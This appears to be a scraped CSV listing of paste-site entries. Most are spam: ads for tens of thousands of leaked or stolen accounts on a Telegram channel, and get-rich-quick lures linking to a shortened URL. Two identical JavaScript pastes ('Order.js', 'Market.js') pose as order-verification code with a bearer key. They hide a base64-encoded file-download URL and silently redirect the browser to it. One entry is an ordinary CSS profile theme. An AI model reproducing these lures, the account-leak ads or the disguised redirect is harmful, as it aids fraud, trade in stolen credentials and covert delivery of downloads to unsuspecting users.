id,title,username,language,date,content
NjQY16Ad,Leaked Accounts - Fresh Hits,iLoveToWatch,JavaScript,Monday 28th of April 2025 07:02:23 AM CDT,32655 Accounts Posted On https://t.me/leakedbyem1nem
2e5H3e9q,Order.js,luqlegal,JavaScript,Monday 28th of April 2025 07:00:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/77684/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yR8cs5ju,EARN $900 INSTANTLY 2025 95,KRATOSPASTEBIN2,JavaScript,Monday 28th of April 2025 06:59:22 AM CDT," 
Pdf https://tinyurl.com/freshleaks

51Yw1pKH8k
"
va44i8X3,Re-Code for Star HeaIer,althindor,CSS,Monday 28th of April 2025 06:56:04 AM CDT,"/* Design by Star HeaIer */
/* Re-Coded by AlthIndor */

html, body {
    background: url('https://i.imgur.com/NmXALhC.png') repeat center top #D8E48D;
    min-height: 1095px;
}
body {position: relative;}

body a {
    text-decoration: none;
    transition: all .5s ease-in-out;
}

#gaia_header a, .panel a {
    color: green !important;
    font-weight: 600 !important;
}
#gaia_header a:hover, .panel a:hover {text-decoration: line-through !important;}
.panel a:hover {color: inherit !important;}

* {cursor: url('https://i.imgur.com/kc9xjRz.png'), default !important;}
.bbcode-swapping-image {mix-blend-mode: multiply;}

/* Fonts */

@font-face {
    font-family: 'Open Sans';
    font-style: normal;
    font-weight: 300 800;
    font-stretch: 100%;
    src: url(https://fonts.gstatic.com/s/opensans/v40/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTSGmu1aB.woff2) format('woff2');
}

@font-face {
    font-family: 'Open Sans';
    font-style: normal;
    font-weight: 300 800;
    font-stretch: 100%;
    src: url(https://fonts.gstatic.com/s/opensans/v40/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTS-muw.woff2) format('woff2');
}

/* Header */

#gaia_header, #gaia_header ul {background: none !important;}
#gaia_header ul, #gaia_header li {margin: 0 5px !important;}
#gaia_header li.spacer {display: none !important;}

#gaia_header ul {
    width: auto !important;
    font: 400 0/29px 'Open Sans', sans-serif !important;
}

#gaia_header #header_right {
    float: right;
    margin: 0 8px 0 0 !important;
}

#gaia_header a {font-size: 10px !important;}
#gaia_header a:hover {opacity: .5;}

#header_left img {
    -webkit-mask: url('https://i.imgur.com/5FTB40o.png') 0 0 no-repeat;
    mask: url('https://i.imgur.com/5FTB40o.png') 0 0 no-repeat;
    background: currentColor;
    width: 0;
    height: 16px;
    padding: 0 37px 0 0;
}

/* Columns */

#columns, #pictures_container, #texts_container {
    top: 100px;
    left: calc(50% - (910px / 2));
}
#pictures_container, #texts_container {position: absolute;}

#columns {
    background: url('https://i.imgur.com/wkWDZOv.png') -22px -8px;
    width: 910px;
    height: 895px;
}
#columns .column {display: contents;}

/* Scrollbars */

#columns ::-webkit-scrollbar, #columns ::-webkit-scrollbar-thumb {
    width: 8px;
    border-radius: 4px;
}
#columns ::-webkit-scrollbar {background: #00800010;}
#columns ::-webkit-scrollbar-thumb {background: green;}

@supports not selector(::-webkit-scrollbar) {
    .panel, dl {
        scrollbar-color: green #00800010;
        scrollbar-width: thin;
    }
}

/* Panels */

.panel {
    background: none;
    color: #316F94;
    font: 10px/1.65 'Open Sans', sans-serif;
    margin: 0;
    padding: 0;
    position: absolute;
    box-sizing: border-box;
}
.panel h2 {display: none;}
.panel img {max-width: 100% !important;}

#id_footprints, #id_wishlist, #id_about, #id_comments dl {overflow: hidden scroll;}
#id_footprints, #id_about, #id_comments dl {padding-right: 10px;}

#id_footprints, #id_wishlist {
    width: 151px;
    height: 181px;
    top: 148px;
}
#id_footprints {left: 540px;}
#id_wishlist {left: 722px;}

#id_about, #id_comments {
    width: 438px;
    height: 215px;
    left: 378px;
}
#id_about {top: 375px;}
#id_comments {top: 622px;}

/* Details */

@keyframes AviBounce {
    from {translate: 0 0;}
    to {translate: 0 -15px;}
}

#id_details {
    top: 182px;
    left: 384px;
}
#id_details p:nth-of-type(n+2), .forum_userstatus {display: none;}
#id_details p {margin: 0;}

@media (prefers-reduced-motion: no-preference) {
    #id_details {animation: AviBounce 2.5s ease-in-out infinite alternate;}
}

/* Visitors */

#id_footprints {line-height: 1.2;}

#id_footprints .item {
    display: flex;
    flex-flow: column nowrap;
    margin-top: 1px;
}
#id_footprints .item:nth-of-type(n+2) {margin-top: 7px;}

#id_footprints a {
    display: inline-flex;
    width: max-content;
}

/* Wish List */

#id_wishlist {
    display: flex;
    flex-flow: row wrap;
    gap: 7px 6px;
    scroll-snap-type: y mandatory;
}
#id_wishlist .premium_sparkle {display: none;}

#id_wishlist .item {
    position: relative;
    scroll-snap-align: start;
    scroll-snap-stop: always;
}

#id_wishlist a {
    display: block;
    background: #FFFFFF80;
    width: 30px;
    height: 30px;
    padding: 5px;
    border-radius: 5px;
}
#id_wishlist a:hover {background: #FFFFFF;}

.owner_checkmark {
    background: #FFFFFF;
    margin: 0;
    padding: 1px;
    bottom: 0;
    right: 0;
    border: 1px solid currentColor;
    pointer-events: none;
}

/* Comments */

#id_comments {
    display: grid;
    grid-template: 25px 1fr / 1fr 1fr;
    gap: 10px;
}
#id_comments :is(#alerts_banner, .date a, .avatarImage, .deletecomment, .clear) {display: none;}
#id_comments #alert_container {display: contents;}

#id_comments dl {grid-column: 1/3;}
#id_comments dd {margin: 0 0 10px 0;}
#id_comments dd:last-of-type {margin: 0;}

#id_comments dt {
    text-align: left;
    padding: 0;
    border-bottom: 1px dashed currentColor;
}
#id_comments .date {margin-left: 1ex;}

/* Comments Links */

#id_comments :is(h2 + div, h2 ~ p, h2 + div a, h2 ~ p a) {
    width: 100%;
    height: 100%;
    color: #FFFFFF !important;
}

#id_comments :is(h2 + div, h2 ~ p) {
    background: green;
    line-height: 23px;
    text-align: center;
    border-radius: 5px;
    overflow: hidden;
}

#id_comments :is(h2 + div, h2 ~ p) a {
    display: block;
    font-size: 0;
    text-decoration: none !important;
}
#id_comments :is(h2 + div, h2 ~ p) a:hover {opacity: .5;}

#id_comments :is(h2 + div, h2 ~ p) a::before {font-size: 10px;}
#id_comments h2 + div a::before {content: 'POST NEW COMMENT';}
#id_comments h2 ~ p a::before {content: 'VIEW ALL COMMENTS';}

@supports selector(#id_comments:has(#alert_container)) {
    #id_comments h2 + div::before {
        content: 'COMMENTS DISABLED';
        font-weight: 600;
    }
    #id_comments:has(#alert_container) h2 + div::before {content: unset;}
}

/* Buttons */

#id_contact {
    top: 611px;
    right: 6px;
}
#id_contact li {margin-bottom: 11px;}

#id_contact li * {
    display: block;
    background: url('https://i.imgur.com/I8AAqiL.png') top center no-repeat;
    width: 72px;
    height: 72px;
    font-size: 0;
    border-radius: 50%;
}
#id_contact li:nth-of-type(2) * {background-position-y: -72px;}
#id_contact li:nth-of-type(3) * {background-position-y: -144px;}

#id_contact a:hover {
    opacity: .5;
    rotate: 1turn;
}

/* Media */

.media_panel {
    background: url('https://i.imgur.com/MWTKBXK.gif') center no-repeat !important;
    width: 20px;
    height: 20px !important;
    font-size: 0;
    top: 108px;
    left: 317px;
    overflow: hidden;
}
form .media_panel {overflow: visible;}

.media_panel iframe {
    width: 300px;
    height: 200px;
    position: absolute;
    bottom: calc(50% - 20px);
    left: calc(50% - 35px);
    opacity: .001;
}

/* Avatars */

.avatar_decoration {left: 841px !important;}
.avatar_decoration:nth-child(1) {top: 362px !important;}
.avatar_decoration:nth-child(2) {top: 421px !important;}
.avatar_decoration:nth-child(3) {top: 480px !important;}
.avatar_decoration:nth-child(4) {top: 539px !important;}

.avatar_decoration img[width='48'] {
    background: gainsboro;
    border: 3px solid #1CAC1C;
    border-radius: 50%;
    transition: rotate .5s ease-in-out;
}
.avatar_decoration img[width='48']:hover {rotate: 1turn;}"
PYeDeqyF,Make $1000 15-MINUTES (BEGINNER) L4,KRATOSPASTEBIN2,JavaScript,Monday 28th of April 2025 06:50:07 AM CDT," 
Pdf https://tinyurl.com/freshleaks

HvvM8HOJcK
"
GsLch33v,Chaturbate with Tokens,iLoveToWatch,JavaScript,Monday 28th of April 2025 06:47:00 AM CDT,93457 Accounts Posted On https://t.me/leakedbyem1nem
MDiuukHd,Market.js,luqlegal,JavaScript,Monday 28th of April 2025 06:45:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16566/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
n3645WrQ,EARN $900 INSTANTLY 2025⭐ GV,KRATOSPASTEBIN2,JavaScript,Monday 28th of April 2025 06:40:48 AM CDT," 
Pdf https://tinyurl.com/freshleaks

DphTTEwz84
"
YHP7cMRC,Crypto Accounts,iLoveToWatch,JavaScript,Monday 28th of April 2025 06:31:38 AM CDT,48609 Accounts Posted On https://t.me/leakedbyem1nem
AWBTuw1x,Make $1000 15-MINUTES  (BEGINNER) YR,KRATOSPASTEBIN2,JavaScript,Monday 28th of April 2025 06:31:34 AM CDT," 
Pdf https://tinyurl.com/freshleaks

wDqRur7Mus
"
